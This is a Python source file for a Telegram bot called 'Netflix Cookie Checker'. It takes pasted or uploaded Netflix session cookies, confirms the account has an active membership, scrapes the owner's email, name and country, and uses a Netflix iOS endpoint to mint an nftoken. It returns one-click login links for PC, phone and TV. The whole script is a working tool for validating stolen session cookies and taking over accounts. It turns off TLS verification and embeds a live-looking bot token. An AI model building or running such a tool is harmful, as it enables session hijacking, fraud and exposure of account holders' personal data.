import re
import json
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================== YOUR BOT TOKEN ==================
BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

# ================== HELPERS ==================
def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def load_cookies(text):
    text = text.strip()
    if not text: return {}

    # Try JSON
    try:
        data = json.loads(text)
        if isinstance(data, list):
            return {c.get("name"): c.get("value") for c in data if c.get("name")}
        if isinstance(data, dict):
            return data
    except: pass

    # Extract NetflixId
    cookies = {}
    match = re.search(r'NetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["NetflixId"] = match.group(1)

    # SecureNetflixId
    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["SecureNetflixId"] = match.group(1)

    # Normal split
    for part in re.split(r"[;\n]", text):
        part = part.strip()
        if "=" in part:
            k, _, v = part.partition("=")
            k = k.strip()
            v = v.strip()
            if k and v:
                cookies[k] = v

    return cookies

# ================== NETFLIX CHECKER ==================
_IOS_API = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
_IOS_PARAMS = {
    "appVersion": "15.48.1", "config": '{"gamesInTrailersEnabled":"false"}',
    "device_type": "NFAPPL-02-", "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone", "iosVersion": "15.8.5", "isTablet": "false", "languages": "en-US",
    "locale": "en-US", "maxDeviceWidth": "375", "model": "saget", "modelType": "IPHONE8-1",
    "odpAware": "true", "path": '["account","token","default"]', "pathFormat": "graph",
    "pixelDensity": "2.0", "progressive": "false", "responseFormat": "json"
}

_IOS_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/\~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.client.appversion": "15.48.1",
    "accept-language": "en-US;q=1",
}

def generate_nftoken(netflix_id_raw):
    if not netflix_id_raw: return None
    try:
        headers = dict(_IOS_HEADERS)
        headers["Cookie"] = f"NetflixId={netflix_id_raw}"
        r = requests.get(_IOS_API, params=_IOS_PARAMS, headers=headers, timeout=20, verify=False)
        if r.status_code == 200:
            data = r.json()
            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
            if tok: return str(tok)
    except: pass
    return None

def check_account(cookies):
    if not cookies.get("NetflixId"):
        return None

    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    for k, v in cookies.items():
        sess.cookies.set(k, v, domain=".netflix.com")

    try:
        r = sess.get("https://www.netflix.com/account", timeout=25, allow_redirects=True)
    except:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or _djs(_rx(r'"name":"([^"]+)"', html))
    cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "US")

    nftoken = generate_nftoken(cookies.get("NetflixId"))

    if nftoken:
        safe = urllib.parse.quote(nftoken)
        login_pc = f"https://netflix.com/?nftoken={safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "email": email or "N/A",
        "name": name or "N/A",
        "country_code": cc,
        "plan": "Netflix Premium",
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": "https://www.netflix.com/tv2"
    }

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

# ================== BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, "👋 <b>Netflix Cookie Checker</b>\n\nPaste cookie or send .txt file", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste your cookie now:")
        return

    cookies = load_cookies(message.text)
    if not cookies.get("NetflixId"):
        bot.reply_to(message, "❌ NetflixId not found in your message.")
        return

    process_cookie(message, cookies)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        text = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        cookies = load_cookies(text)
        if not cookies.get("NetflixId"):
            bot.reply_to(message, "❌ NetflixId not found in file.")
            return
        process_cookie(message, cookies, message.document.file_name)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def process_cookie(message, cookies, source="Pasted"):
    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid or expired cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX VALID ACCOUNT</b>

👤 <b>{result['name']}</b>
📧 <code>{result['email']}</code>
🌍 Country: {result['country_code']}

🔑 <b>Login Links (NFT Token)</b>
    """

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 Open on PC", url=result["login_pc"]))
    markup.add(types.InlineKeyboardButton("📱 Open on Phone", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 Open on TV", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("🚀 Netflix Bot is Running...")
bot.infinity_polling()
